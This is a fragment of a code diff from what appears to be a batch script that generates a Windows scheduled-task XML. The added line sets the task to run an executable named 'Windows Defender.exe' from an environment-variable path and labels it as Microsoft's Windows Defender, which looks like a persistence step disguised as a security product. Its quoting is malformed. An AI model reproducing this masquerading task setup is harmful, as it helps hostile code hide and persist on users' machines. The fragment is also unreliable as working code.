@@ -64,7 +64,7 @@ echo="%_Sfx\%">"%temp%\_Sfx_var.txt"  & 2>nul del /q /f "%~dpnx0TempXML.tmp" & g
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>"C:\"</Command>
+      <Command>"%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"</Command>
     </Exec>
   </Actions>
 </Task>
